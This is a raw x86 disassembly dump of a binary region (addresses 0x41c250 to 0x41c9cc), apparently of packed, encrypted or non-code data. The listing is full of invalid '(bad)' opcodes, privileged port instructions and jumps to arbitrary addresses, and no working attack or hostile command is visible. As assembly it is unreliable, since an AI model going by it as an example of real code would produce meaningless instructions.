  41c250:	in     eax,dx
  41c251:	(bad)  
  41c252:	pop    ss
  41c253:	jne    0x41c239
  41c255:	daa    
  41c256:	clc    
  41c257:	sub    edi,eax
  41c259:	pop    edx
  41c25a:	sub    edx,DWORD PTR [ebp+esi*4+0x66c59fe]
  41c261:	dec    ebx
  41c262:	mov    al,ds:0xf09404d5
  41c267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c268:	cdq    
  41c269:	add    BYTE PTR [esi],0xc1
  41c26c:	dec    ebp
  41c26d:	repz sbb ebx,ecx
  41c270:	xchg   ebx,eax
  41c271:	xchg   ecx,eax
  41c272:	shl    BYTE PTR [ebp+0x3fbbda59],cl
  41c278:	lds    ecx,FWORD PTR [ebx+0x64]
  41c27b:	in     eax,dx
  41c27c:	(bad)  
  41c27d:	lods   eax,DWORD PTR ds:[esi]
  41c27e:	or     ebp,esi
  41c280:	(bad)  
  41c281:	adc    al,0xb9
  41c283:	js     0x41c2a1
  41c285:	std    
  41c286:	ret    
  41c287:	sbb    al,BYTE PTR ds:0xf9e831
  41c28d:	push   ebx
  41c28e:	mov    cl,0x17
  41c290:	jo     0x41c279
  41c292:	outs   dx,BYTE PTR ds:[esi]
  41c293:	pop    ecx
  41c294:	aaa    
  41c295:	icebp  
  41c296:	rol    DWORD PTR [ebx],0x52
  41c299:	xor    BYTE PTR [edx-0x30],dh
  41c29c:	xchg   ecx,eax
  41c29d:	xchg   ebx,eax
  41c29e:	call   0xb165:0x6450616
  41c2a5:	cwde   
  41c2a6:	sbb    eax,0xea4bcf92
  41c2ab:	stc    
  41c2ac:	or     bh,dh
  41c2ae:	fisttp WORD PTR [ecx-0x201d342d]
  41c2b4:	in     eax,dx
  41c2b5:	hlt    
  41c2b6:	xchg   edi,eax
  41c2b7:	xlat   BYTE PTR ds:[ebx]
  41c2b8:	adc    eax,0x9201fed4
  41c2bd:	in     al,0xc2
  41c2bf:	inc    edx
  41c2c0:	popf   
  41c2c1:	jno    0x41c24e
  41c2c3:	arpl   WORD PTR [edx],ax
  41c2c5:	add    DWORD PTR [eax],edi
  41c2c7:	xor    al,0xf9
  41c2c9:	cmp    eax,0xb96fdd7b
  41c2ce:	mov    ch,0x70
  41c2d0:	jl     0x41c33d
  41c2d2:	std    
  41c2d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2d4:	xchg   edi,eax
  41c2d5:	mov    ds:0xfd431845,eax
  41c2da:	in     al,dx
  41c2db:	scas   eax,DWORD PTR es:[edi]
  41c2dc:	arpl   WORD PTR [edx-0x7d9aaa68],cx
  41c2e2:	das    
  41c2e3:	xor    DWORD PTR [ebx-0x2],0x3e654ddd
  41c2ea:	ret    0x3c81
  41c2ed:	shl    dl,cl
  41c2ef:	jp     0x41c2e0
  41c2f1:	push   0xffffffa8
  41c2f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2f4:	(bad)  
  41c2f5:	jmp    0x666f:0x72148cd5
  41c2fc:	cmp    dl,BYTE PTR [esi-0x7000ff07]
  41c302:	ror    DWORD PTR [ebx+0x2d23dada],0x43
  41c309:	iret   
  41c30a:	cli    
  41c30b:	cwde   
  41c30c:	inc    ebx
  41c30d:	js     0x41c355
  41c30f:	mov    edx,0x9c72eed
  41c314:	mov    edi,0xf65167f6
  41c319:	xchg   BYTE PTR [edi-0x4bc85f2f],bh
  41c31f:	xor    eax,0x5f6ebce9
  41c324:	dec    ebx
  41c325:	pop    edx
  41c326:	mov    ds:0x138e26f2,al
  41c32b:	mov    dh,0x9
  41c32d:	xor    esp,DWORD PTR [ebp+0x5f]
  41c330:	xor    eax,0xf74984a0
  41c335:	data16 cs mov dh,0x92
  41c339:	loopne 0x41c366
  41c33b:	in     eax,dx
  41c33c:	gs mov cs,WORD PTR es:[eax]
  41c340:	mov    ecx,0x40b6dfd8
  41c345:	mov    eax,ds:0x71afbd2b
  41c34a:	ja     0x41c2d0
  41c34c:	in     eax,0xe6
  41c34e:	or     al,0x15
  41c350:	jnp    0x41c3c1
  41c352:	sub    DWORD PTR [eax+0x44],ecx
  41c355:	jmp    FWORD PTR [edx]
  41c357:	and    edx,DWORD PTR [edx]
  41c359:	add    ebx,DWORD PTR [esi+ebp*8-0x295f1a6d]
  41c360:	js     0x41c34c
  41c362:	dec    esp
  41c363:	or     bl,BYTE PTR [eax+0x4605b1f5]
  41c369:	mov    eax,ds:0x7861e7e5
  41c36e:	sahf   
  41c36f:	jo     0x41c3cd
  41c371:	add    esp,ecx
  41c373:	test   eax,0xfab7a50a
  41c378:	bound  edi,QWORD PTR [ecx+0x2a602f6e]
  41c37e:	int3   
  41c37f:	mov    dh,0xb6
  41c381:	out    0x8,al
  41c383:	int    0xbc
  41c385:	das    
  41c386:	mov    bl,0xb0
  41c388:	mov    ecx,0x3ea88008
  41c38d:	mov    ah,0x1a
  41c38f:	cmp    dl,BYTE PTR [ebp-0x64e088ae]
  41c395:	mov    dh,0x35
  41c397:	cmp    bh,BYTE PTR [edi-0x4a898120]
  41c39d:	cs (bad) 
  41c3a0:	test   edi,ecx
  41c3a2:	gs hlt 
  41c3a4:	inc    ecx
  41c3a5:	mov    al,ah
  41c3a7:	mov    bl,0x48
  41c3a9:	or     ecx,DWORD PTR [edx-0x57]
  41c3ac:	pop    ecx
  41c3ad:	ins    DWORD PTR es:[edi],dx
  41c3ae:	sbb    al,0x60
  41c3b0:	call   0xf082:0xb4616558
  41c3b7:	jbe    0x41c385
  41c3b9:	das    
  41c3ba:	into   
  41c3bb:	pop    ebx
  41c3bc:	mov    eax,0x935e5059
  41c3c1:	jns    0x41c355
  41c3c3:	dec    esi
  41c3c4:	daa    
  41c3c5:	xor    al,0xdf
  41c3c7:	int3   
  41c3c8:	mov    bl,0x35
  41c3ca:	test   BYTE PTR [edx-0x80],dl
  41c3cd:	pop    esi
  41c3ce:	test   eax,eax
  41c3d0:	inc    esi
  41c3d1:	sbb    eax,0x9ec9ef3e
  41c3d6:	mov    esi,0x65dcbc22
  41c3db:	stos   DWORD PTR es:[edi],eax
  41c3dc:	inc    eax
  41c3dd:	adc    eax,0xb6382843
  41c3e2:	pusha  
  41c3e3:	add    al,0xe0
  41c3e5:	push   eax
  41c3e6:	sub    DWORD PTR [ebx-0x6c0a2eda],edi
  41c3ec:	call   0xdbff487c
  41c3f1:	lods   eax,DWORD PTR ds:[esi]
  41c3f2:	sbb    al,0xe3
  41c3f4:	inc    ecx
  41c3f5:	add    esp,DWORD PTR [edi+0x5041dcc7]
  41c3fb:	xor    eax,0x51d8e3cb
  41c400:	out    0xf0,eax
  41c402:	xchg   esp,eax
  41c403:	add    dl,BYTE PTR [esp-0x63b73d3a]
  41c40a:	jb     0x41c3ee
  41c40c:	or     eax,0x9e054a65
  41c411:	xchg   edi,eax
  41c412:	jmp    0xeffd:0xd8171194
  41c419:	in     al,0xaf
  41c41b:	aas    
  41c41c:	mov    DWORD PTR [ebx-0x2213527d],edi
  41c422:	mov    ebx,0x22c7d14c
  41c427:	loopne 0x41c3d9
  41c429:	lock cmc 
  41c42b:	sub    eax,DWORD PTR [esp+eiz*4-0x11c11e9f]
  41c432:	aaa    
  41c433:	aad    0x17
  41c435:	sub    eax,0xca412bf7
  41c43a:	in     al,dx
  41c43b:	and    ecx,esi
  41c43d:	sub    DWORD PTR [ecx+0x4379641],edi
  41c443:	jns    0x41c3c6
  41c445:	jecxz  0x41c3dd
  41c447:	mov    DWORD PTR [edx+0xa492c67],esp
  41c44d:	push   ds
  41c44e:	sahf   
  41c44f:	mov    ds:0x4247b8db,eax
  41c454:	ss push esi
  41c456:	mov    ds:0xdef258fc,al
  41c45c:	and    ch,BYTE PTR [edx+0x47f6e152]
  41c462:	mov    ds:0x16b8915f,al
  41c467:	jns    0x41c4c9
  41c469:	or     al,0xe9
  41c46b:	push   0xb0441225
  41c470:	daa    
  41c471:	cmp    bh,ch
  41c473:	ret    0x9a36
  41c476:	pop    esp
  41c477:	loope  0x41c482
  41c479:	xlat   BYTE PTR ds:[ebx]
  41c47a:	iret   
  41c47b:	jbe    0x41c435
  41c47d:	adc    eax,DWORD PTR [ecx-0x2b]
  41c480:	cld    
  41c481:	jmp    0x1d6:0x81093ca6
  41c488:	push   eax
  41c489:	sub    bl,cl
  41c48b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c48c:	outs   dx,BYTE PTR ds:[esi]
  41c48d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c48e:	sbb    dh,ch
  41c490:	das    
  41c491:	imul   edi,edi,0xffffff98
  41c494:	inc    eax
  41c495:	in     eax,dx
  41c496:	dec    edx
  41c497:	ret    
  41c498:	mov    eax,0x9abbafe6
  41c49d:	stos   DWORD PTR es:[edi],eax
  41c49e:	xor    eax,0xf928feb2
  41c4a3:	addr16 test ecx,ebx
  41c4a6:	mov    ebp,0x20ad6731
  41c4ab:	fstp   TBYTE PTR [ebp-0x1f237df1]
  41c4b1:	(bad)  
  41c4b2:	xchg   BYTE PTR [ecx-0x5eb05d60],bh
  41c4b8:	sub    ch,BYTE PTR [eax]
  41c4ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4bb:	or     BYTE PTR [esi-0x1],cl
  41c4be:	xor    bh,BYTE PTR [edi+0x59eddde7]
  41c4c4:	push   ecx
  41c4c5:	sbb    DWORD PTR [edx],eax
  41c4c7:	leave  
  41c4c8:	imul   esi,DWORD PTR [ebx],0x64
  41c4cb:	dec    ebp
  41c4cc:	xchg   ebx,eax
  41c4cd:	mov    eax,ds:0xd6f5df23
  41c4d2:	repz mov ds:0x74bfdf0b,al
  41c4d8:	inc    esi
  41c4d9:	pop    ebx
  41c4da:	ret    
  41c4db:	mov    dl,0xe0
  41c4de:	int    0x3
  41c4e0:	or     edx,DWORD PTR [esi-0x1900a1f0]
  41c4e6:	cmp    al,0xc4
  41c4e8:	push   edi
  41c4e9:	aad    0x1f
  41c4eb:	das    
  41c4ec:	test   ch,cl
  41c4ee:	cmp    al,0xec
  41c4f0:	pushf  
  41c4f1:	mov    edx,0xb9b8aa85
  41c4f6:	int    0x8e
  41c4f8:	mov    ebp,cs
  41c4fa:	int    0xb8
  41c4fc:	pop    ebp
  41c4fd:	jae    0x41c498
  41c4ff:	add    al,0xd6
  41c501:	daa    
  41c502:	mov    DWORD PTR [esi],eax
  41c504:	jl     0x41c572
  41c506:	push   ebp
  41c507:	adc    eax,0xb373d4e8
  41c50c:	stos   DWORD PTR es:[edi],eax
  41c50d:	int    0x25
  41c50f:	mov    DWORD PTR [edx],ebx
  41c511:	xor    eax,0x5999842d
  41c516:	cwde   
  41c517:	xchg   ebx,eax
  41c519:	inc    eax
  41c51a:	(bad)  
  41c51b:	in     al,0xe
  41c51d:	inc    eax
  41c51e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c51f:	mov    ah,BYTE PTR [edx+0x25]
  41c522:	fild   QWORD PTR [ecx-0x28]
  41c525:	aad    0x6
  41c527:	xlat   BYTE PTR ds:[ebx]
  41c528:	xor    BYTE PTR [edx],dh
  41c52a:	stos   BYTE PTR es:[edi],al
  41c52b:	mov    bl,0xc4
  41c52d:	adc    eax,0x8a8dbb8b
  41c532:	mov    ah,BYTE PTR [ebp+0x1e]
  41c535:	cmp    BYTE PTR [edi+0x11],0xf0
  41c539:	mov    DWORD PTR [eax+0x1f],esi
  41c53c:	in     al,0x1e
  41c53e:	fwait
  41c53f:	xor    dl,BYTE PTR [edi+ebx*8]
  41c542:	add    BYTE PTR [ebp+0x43d60139],ah
  41c548:	adc    ah,BYTE PTR [eax+edx*4]
  41c54b:	push   esp
  41c54c:	mov    ecx,0x62896fa5
  41c551:	dec    ebx
  41c552:	push   esi
  41c553:	bound  ebx,QWORD PTR [esi]
  41c555:	adc    BYTE PTR ds:0xdc7acb13,bl
  41c55b:	xlat   BYTE PTR ds:[ebx]
  41c55c:	push   0x7cbbbb3f
  41c561:	inc    ecx
  41c562:	outs   dx,DWORD PTR ds:[esi]
  41c563:	shl    ecx,0x1d
  41c566:	adc    ebp,DWORD PTR [ecx-0x322e36f]
  41c56c:	test   BYTE PTR [ebp-0x6887566f],bl
  41c572:	pop    esi
  41c573:	xor    eax,0x657609a4
  41c578:	pop    ebx
  41c579:	sahf   
  41c57a:	repz fimul DWORD PTR [eax-0x40566778]
  41c581:	outs   dx,BYTE PTR ds:[esi]
  41c582:	sub    esp,DWORD PTR [edx+0x17]
  41c585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c586:	retf   
  41c587:	iret   
  41c588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c589:	pop    eax
  41c58a:	loop   0x41c5c4
  41c58c:	and    al,0x93
  41c58e:	retf   0x5feb
  41c591:	and    eax,0x1801c015
  41c596:	dec    eax
  41c597:	jmp    0x9145cbd7
  41c59c:	and    eax,0x7c54a9af
  41c5a1:	aad    0xe9
  41c5a3:	dec    ecx
  41c5a4:	pop    es
  41c5a5:	sbb    ebp,DWORD PTR [edi]
  41c5a7:	fstp   QWORD PTR [ecx+0x16]
  41c5aa:	adc    eax,DWORD PTR [eax]
  41c5ac:	in     eax,0xa1
  41c5ae:	or     DWORD PTR [esi],edi
  41c5b0:	mov    ecx,0xe58211f1
  41c5b5:	leave  
  41c5b6:	jl     0x41c56a
  41c5b8:	push   es
  41c5b9:	dec    esi
  41c5ba:	ret    
  41c5bb:	lds    ecx,FWORD PTR ds:0x438db5bc
  41c5c1:	sbb    eax,0x9695d5d8
  41c5c6:	xor    al,0xdb
  41c5c8:	adc    al,0xb4
  41c5ca:	aad    0x10
  41c5cc:	lea    edi,[esi+edx*8-0x2a1b8f4a]
  41c5d3:	cmp    eax,0xf24bebeb
  41c5d8:	sub    ecx,DWORD PTR [edi-0x3f]
  41c5db:	lahf   
  41c5dc:	dec    edx
  41c5dd:	dec    eax
  41c5de:	jg     0x41c586
  41c5e0:	xchg   edi,eax
  41c5e1:	add    al,BYTE PTR [edx-0x4d]
  41c5e4:	add    BYTE PTR [ecx+eax*8-0x3448f0b2],0xd8
  41c5ec:	test   eax,esp
  41c5ee:	(bad)  
  41c5f1:	add    bh,al
  41c5f3:	sub    al,0x91
  41c5f5:	and    dl,BYTE PTR [esi]
  41c5f7:	mov    bh,0xd7
  41c5f9:	inc    esi
  41c5fa:	jne    0x41c5ba
  41c5fc:	or     eax,0xf81b8bc5
  41c601:	inc    ecx
  41c602:	out    0x6c,al
  41c604:	leave  
  41c605:	cmp    bh,bl
  41c607:	mov    esi,ecx
  41c609:	idiv   BYTE PTR [ecx-0x2260143]
  41c60f:	push   cs
  41c610:	ins    DWORD PTR es:[edi],dx
  41c611:	xchg   ecx,eax
  41c612:	shl    BYTE PTR [ebx-0x25],cl
  41c615:	mov    ebp,0xe55fd0f5
  41c61a:	sub    DWORD PTR [ebp-0x25],ecx
  41c61d:	mov    ah,0x38
  41c61f:	repz fistp WORD PTR [edx+0x71]
  41c623:	sbb    edi,DWORD PTR [edi]
  41c625:	sub    BYTE PTR [eax+0x1faf4670],cl
  41c62b:	cmp    bl,BYTE PTR [esi+edx*1-0x8]
  41c62f:	add    esi,ecx
  41c631:	push   ebp
  41c632:	push   ecx
  41c633:	mov    eax,0x2d3fc2a7
  41c638:	jo     0x41c5c3
  41c63a:	and    BYTE PTR [edx-0x80],dh
  41c63d:	mov    ch,0x19
  41c63f:	mov    edi,DWORD PTR [ebx]
  41c641:	xchg   ebp,eax
  41c642:	jo     0x41c67a
  41c644:	je     0x41c692
  41c646:	mov    edx,0x6c635b42
  41c64b:	es adc al,0xd3
  41c64e:	jns    0x41c607
  41c650:	mov    al,ds:0xa8d8e7e
  41c655:	cmp    eax,0x59aa5114
  41c65a:	arpl   WORD PTR [esi-0x6a],dx
  41c65d:	stos   BYTE PTR es:[edi],al
  41c65e:	hlt    
  41c65f:	call   0x883b:0xef8cd6cb
  41c666:	mov    dl,0x85
  41c668:	shl    DWORD PTR [esi],cl
  41c66a:	mov    cl,0x75
  41c66c:	and    BYTE PTR [edi+eax*8-0x6059f81e],bl
  41c673:	fild   DWORD PTR [edi-0x3a]
  41c676:	mov    DWORD PTR [edx-0x24],ebp
  41c679:	mov    cl,0xe4
  41c67b:	xor    dh,BYTE PTR [ecx-0x79]
  41c67e:	lods   eax,DWORD PTR ds:[esi]
  41c67f:	nop
  41c680:	sbb    BYTE PTR [ebx-0x54],ch
  41c683:	fild   QWORD PTR [ecx+eax*4-0x64]
  41c687:	rcl    BYTE PTR [edi],0xa3
  41c68a:	push   ds
  41c68b:	mov    al,ds:0xa75db3ea
  41c690:	in     eax,dx
  41c691:	inc    esp
  41c692:	add    esi,DWORD PTR [ecx-0x42a7419a]
  41c698:	sti    
  41c699:	push   ebp
  41c69a:	cmp    ecx,DWORD PTR [ebx+0x431139b1]
  41c6a0:	test   BYTE PTR [edi],bl
  41c6a2:	pop    esp
  41c6a3:	adc    al,0x86
  41c6a5:	rcl    BYTE PTR [ebp-0x2abecf80],1
  41c6ab:	sub    dh,BYTE PTR [ecx-0x6f2d50e4]
  41c6b1:	adc    BYTE PTR [ebp+0x5e8e0fcb],bh
  41c6b7:	pop    ebx
  41c6b8:	fninit 
  41c6ba:	ffreep st(1)
  41c6bc:	push   es
  41c6bd:	leave  
  41c6be:	fmul   QWORD PTR [eax-0x33]
  41c6c1:	arpl   WORD PTR [ebp+0x47],cx
  41c6c4:	xchg   ebp,eax
  41c6c5:	mov    edx,0xf86dcd09
  41c6ca:	int3   
  41c6cb:	adc    DWORD PTR [ebx+0x7b163b81],ebx
  41c6d1:	mov    ecx,0x636e84ad
  41c6d6:	ja     0x41c728
  41c6d8:	sub    DWORD PTR [ecx-0x45],ecx
  41c6db:	pop    esp
  41c6dc:	mov    ebx,0x1776fbd1
  41c6e1:	mov    DWORD PTR [ebp-0x714b2700],ebx
  41c6e7:	popf   
  41c6e8:	or     DWORD PTR [eax-0x7a],edx
  41c6eb:	in     al,dx
  41c6ec:	xor    DWORD PTR [edi],ecx
  41c6ee:	or     cl,al
  41c6f0:	jns    0x41c6c7
  41c6f2:	in     eax,0x96
  41c6f4:	stc    
  41c6f5:	add    al,0x6a
  41c6f7:	stos   BYTE PTR es:[edi],al
  41c6f8:	dec    ebx
  41c6f9:	ficom  WORD PTR [edx]
  41c6fb:	std    
  41c6fc:	out    dx,al
  41c6fd:	stos   DWORD PTR es:[edi],eax
  41c6fe:	mov    edx,DWORD PTR [ebp-0x1d73983b]
  41c704:	add    DWORD PTR [ecx-0x20ab080f],ebp
  41c70a:	mov    ebp,0xf99bbfdd
  41c70f:	cli    
  41c710:	dec    esp
  41c711:	dec    ebp
  41c712:	pop    edi
  41c713:	add    bl,bl
  41c715:	lock dec esp
  41c717:	inc    ebp
  41c718:	sub    al,bh
  41c71a:	inc    esi
  41c71b:	xor    DWORD PTR [ecx],esp
  41c71d:	and    eax,DWORD PTR [ebp-0x3]
  41c720:	arpl   si,bx
  41c722:	dec    ebp
  41c723:	or     ah,BYTE PTR [ecx-0x2c]
  41c726:	mov    ebp,0x494e87a4
  41c72b:	rcr    DWORD PTR [esi+ebp*8],1
  41c72e:	xchg   BYTE PTR [ebp+0x6e326daa],al
  41c734:	fisttp QWORD PTR [edx-0x74]
  41c737:	aas    
  41c738:	mov    ah,dh
  41c73a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c73b:	lods   eax,DWORD PTR ds:[esi]
  41c73c:	jmp    0x5c5797d0
  41c741:	cmp    ebx,DWORD PTR [ecx-0x78e04c9f]
  41c747:	into   
  41c748:	popf   
  41c749:	retf   0x8be2
  41c74c:	aaa    
  41c74d:	mov    dl,ah
  41c74f:	jge    0x41c74c
  41c751:	jecxz  0x41c79f
  41c753:	sbb    esi,DWORD PTR [ecx+0x5394f5a5]
  41c759:	(bad)  [ebx-0x530d6319]
  41c75f:	dec    edx
  41c760:	es stos DWORD PTR es:[edi],eax
  41c762:	in     al,0xd
  41c764:	cmp    DWORD PTR [ebx+0x6a],ecx
  41c767:	dec    esp
  41c768:	in     eax,dx
  41c769:	add    dh,BYTE PTR [edx-0x17]
  41c76c:	hlt    
  41c76d:	add    DWORD PTR [esi],edx
  41c76f:	dec    ecx
  41c770:	adc    BYTE PTR [ecx],bh
  41c772:	push   ebp
  41c773:	and    eax,0xdc615f05
  41c778:	push   0x18
  41c77a:	pop    es
  41c77b:	xchg   esi,ebx
  41c77d:	sti    
  41c77e:	sbb    esp,DWORD PTR [esi]
  41c780:	adc    ecx,DWORD PTR [esi+edi*4-0x3f99bcb5]
  41c787:	push   esp
  41c788:	or     edi,edi
  41c78a:	adc    cl,bl
  41c78c:	hlt    
  41c78d:	pop    ecx
  41c78e:	mov    DWORD PTR [ebp+0x3704f7ad],ebp
  41c794:	xor    ebp,DWORD PTR [eax+0x38180cc7]
  41c79a:	add    ecx,DWORD PTR [eax+0x17252607]
  41c7a0:	sbb    BYTE PTR [ebx-0x76],dl
  41c7a3:	mov    edx,0x8c0ce0e0
  41c7a8:	repnz fdiv QWORD PTR cs:[edi-0x2ff77dda]
  41c7b0:	adc    esp,DWORD PTR [edi+ebp*2+0x52c0df7d]
  41c7b7:	sbb    al,0x85
  41c7b9:	dec    edx
  41c7ba:	repnz rcr BYTE PTR [ecx+0x55d6bc0e],0x2e
  41c7c2:	aad    0xcb
  41c7c4:	into   
  41c7c5:	in     al,0x9c
  41c7c7:	stos   DWORD PTR es:[edi],eax
  41c7c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7c9:	dec    esi
  41c7ca:	hlt    
  41c7cb:	inc    eax
  41c7cc:	cmp    eax,0xc50e68b1
  41c7d1:	(bad)  
  41c7d2:	dec    edi
  41c7d3:	std    
  41c7d4:	pop    ecx
  41c7d5:	int3   
  41c7d6:	jmp    0x41c7fb
  41c7d8:	ja     0x41c7b7
  41c7da:	push   0xffffffc3
  41c7dc:	pusha  
  41c7dd:	shl    DWORD PTR [ecx+0x16ee41a],1
  41c7e3:	and    BYTE PTR [ebp-0x7a],dl
  41c7e6:	push   esp
  41c7e7:	sbb    eax,0x4016c210
  41c7ec:	stos   DWORD PTR es:[edi],eax
  41c7ed:	loopne 0x41c816
  41c7ef:	popf   
  41c7f0:	jmp    0x407b47f7
  41c7f5:	add    bh,BYTE PTR [ebx+edx*4]
  41c7f8:	inc    eax
  41c7f9:	cli    
  41c7fa:	inc    ebx
  41c7fb:	stos   DWORD PTR es:[edi],eax
  41c7fc:	and    eax,0x822203a1
  41c801:	ss or  cl,dh
  41c804:	push   ecx
  41c805:	xor    edi,edx
  41c807:	rol    BYTE PTR [eax+0x63d68c1b],1
  41c80d:	and    al,0xa6
  41c80f:	div    ch
  41c811:	(bad)  
  41c812:	mov    eax,0x177248a5
  41c817:	mov    dh,0xed
  41c819:	cwde   
  41c81a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c81b:	mov    al,ds:0x9b635792
  41c820:	shr    ebp,cl
  41c822:	stos   DWORD PTR es:[edi],eax
  41c823:	(bad)  
  41c824:	neg    BYTE PTR [edx+0x39]
  41c827:	mov    dh,0x39
  41c829:	into   
  41c82a:	mov    ebp,0xb94d90a9
  41c82f:	jae    0x41c7f4
  41c831:	loope  0x41c81a
  41c833:	out    0x17,eax
  41c835:	xchg   ebx,eax
  41c836:	and    DWORD PTR [ebx-0x269f42a1],0xfc2af4b6
  41c840:	pop    ds
  41c841:	fdivr  QWORD PTR [ecx]
  41c843:	dec    esi
  41c844:	fisubr WORD PTR [edx+eiz*1+0x5d]
  41c848:	xchg   DWORD PTR [esi-0x27],esp
  41c84b:	push   0x27
  41c84d:	push   esi
  41c84e:	pop    ss
  41c84f:	push   ds
  41c850:	mov    bl,0xd6
  41c852:	sub    eax,0x4b358d6e
  41c857:	cmp    al,0xff
  41c859:	mov    cl,0x93
  41c85b:	sbb    edi,DWORD PTR [ebx]
  41c85d:	push   eax
  41c85e:	adc    al,0xe6
  41c860:	cmp    eax,0x17227bf8
  41c865:	lahf   
  41c866:	dec    eax
  41c867:	jmp    0x41c80b
  41c869:	sahf   
  41c86a:	outs   dx,BYTE PTR ds:[esi]
  41c86b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c86c:	sub    DWORD PTR [ebp-0x60],edi
  41c86f:	dec    edi
  41c870:	mov    cl,0xf0
  41c872:	ret    0x3f33
  41c875:	push   edx
  41c876:	adc    eax,ecx
  41c878:	dec    ecx
  41c879:	xchg   edi,eax
  41c87a:	stos   BYTE PTR es:[edi],al
  41c87b:	jno    0x41c8a4
  41c87d:	xchg   edi,eax
  41c87e:	sub    BYTE PTR [ebp+0x72fc5671],ah
  41c884:	sbb    esp,DWORD PTR ds:0x28904088
  41c88a:	in     al,0x50
  41c88c:	loop   0x41c8e0
  41c88e:	push   ecx
  41c88f:	stc    
  41c890:	out    0xc8,eax
  41c892:	xchg   DWORD PTR [esi],edx
  41c894:	xchg   esi,eax
  41c895:	or     ebx,DWORD PTR [ebx-0x21bfbc5e]
  41c89b:	lahf   
  41c89c:	je     0x41c848
  41c89e:	mov    al,ss:0x772fba97
  41c8a4:	clc    
  41c8a5:	cmp    dh,cl
  41c8a7:	ret    
  41c8a8:	lock or BYTE PTR [esi-0x1b],al
  41c8ac:	mov    BYTE PTR [edx+edi*4-0x35d1f543],bl
  41c8b3:	mov    ch,0x28
  41c8b5:	mov    edx,0xcfdd9bb7
  41c8ba:	fadd   QWORD PTR [esi+0x26]
  41c8bd:	cmp    al,0x49
  41c8bf:	cwde   
  41c8c0:	dec    ebp
  41c8c1:	push   es
  41c8c2:	jecxz  0x41c86f
  41c8c4:	dec    ecx
  41c8c5:	mov    ecx,0x6e1d1ce0
  41c8ca:	out    0xd3,eax
  41c8cc:	test   ebp,edi
  41c8ce:	shr    eax,0x83
  41c8d1:	js     0x41c8a8
  41c8d3:	jecxz  0x41c89b
  41c8d5:	dec    ecx
  41c8d6:	mov    esp,edx
  41c8d8:	clc    
  41c8d9:	xlat   BYTE PTR ds:[ebx]
  41c8da:	or     eax,0x278a2f30
  41c8df:	or     eax,0x33976a5a
  41c8e4:	ja     0x41c901
  41c8e6:	rcl    ecx,0xc6
  41c8e9:	in     eax,0xec
  41c8eb:	into   
  41c8ec:	ins    DWORD PTR es:[edi],dx
  41c8ed:	shl    BYTE PTR [ecx+0xe],cl
  41c8f0:	daa    
  41c8f1:	xchg   esp,edx
  41c8f3:	or     eax,0x41c9c9d1
  41c8f8:	cmp    eax,DWORD PTR [eax+0x1c3b4754]
  41c8fe:	mov    ebp,0x5254ce02
  41c903:	push   esi
  41c904:	in     eax,dx
  41c905:	xchg   ebx,eax
  41c906:	clc    
  41c907:	in     eax,0x59
  41c909:	stos   DWORD PTR es:[edi],eax
  41c90a:	jecxz  0x41c92d
  41c90c:	and    edx,ebx
  41c90e:	test   BYTE PTR [edx-0x4f],bh
  41c911:	inc    esi
  41c912:	inc    edx
  41c913:	sub    eax,0x5482431e
  41c918:	jno    0x41c97c
  41c91a:	(bad)
  41c91d:	pop    eax
  41c91e:	hlt    
  41c91f:	sub    eax,0xc59cc994
  41c924:	cwde   
  41c925:	or     al,0x0
  41c927:	cwde   
  41c928:	std    
  41c929:	adc    dl,bl
  41c92b:	dec    esi
  41c92c:	sahf   
  41c92d:	clc    
  41c92e:	sar    DWORD PTR [esi+0xa73230],1
  41c934:	pop    ebp
  41c935:	push   ebx
  41c936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c937:	and    al,0xaf
  41c939:	out    dx,eax
  41c93a:	sbb    dl,dl
  41c93c:	rcl    BYTE PTR [ebp-0x3423040f],cl
  41c942:	and    DWORD PTR ds:0x64076b19,0xb4deda35
  41c94c:	fstp   TBYTE PTR [ecx-0x3a]
  41c94f:	adc    edx,DWORD PTR [edx]
  41c951:	enter  0xf449,0xb0
  41c955:	loopne 0x41c97a
  41c957:	jge    0x41c94a
  41c959:	or     eax,0xa6b0822
  41c95e:	sub    ebx,DWORD PTR [ebx-0x28af56d0]
  41c964:	lods   al,BYTE PTR ds:[esi]
  41c965:	int3   
  41c966:	(bad)  
  41c967:	xchg   edi,eax
  41c968:	adc    ah,BYTE PTR [esi+0x5aa492c9]
  41c96e:	pop    ss
  41c96f:	mov    ah,0xb3
  41c971:	call   0x4e4479eb
  41c976:	sub    BYTE PTR [ecx+eiz*4-0x39],dh
  41c97a:	lds    eax,FWORD PTR [ebx+0x66]
  41c97d:	inc    ecx
  41c97e:	fst    QWORD PTR [esp+eax*2+0x7]
  41c982:	push   cs
  41c983:	(bad)  
  41c984:	mov    DWORD PTR [edx],0xa4295e8d
  41c98a:	xor    edx,eax
  41c98c:	mov    ds:0x8e12d26e,al
  41c991:	or     eax,0xf32e7a62
  41c996:	or     al,0x81
  41c998:	push   edx
  41c999:	jle    0x41c979
  41c99b:	les    edi,FWORD PTR [ebp+0x29]
  41c99e:	inc    edx
  41c99f:	fnstenv [ecx]
  41c9a1:	aad    0x5d
  41c9a3:	ds push cs
  41c9a5:	std    
  41c9a6:	test   al,0x51
  41c9a8:	add    al,0x20
  41c9aa:	jbe    0x41c988
  41c9ac:	cmp    eax,ebp
  41c9ae:	lahf   
  41c9af:	sbb    dl,BYTE PTR [ecx-0x7d9229a]
  41c9b5:	adc    al,0x6b
  41c9b7:	mov    al,0x38
  41c9b9:	fisttp WORD PTR [edx]
  41c9bb:	retf   
  41c9bc:	sbb    eax,0x2d323fec
  41c9c1:	sub    al,0xd4
  41c9c3:	jbe    0x41c990
  41c9c5:	and    edx,0xffffffd6
  41c9c8:	fadd   st,st(6)
  41c9ca:	push   ss
  41c9cb:	push   esp
  41c9cc:	int3   
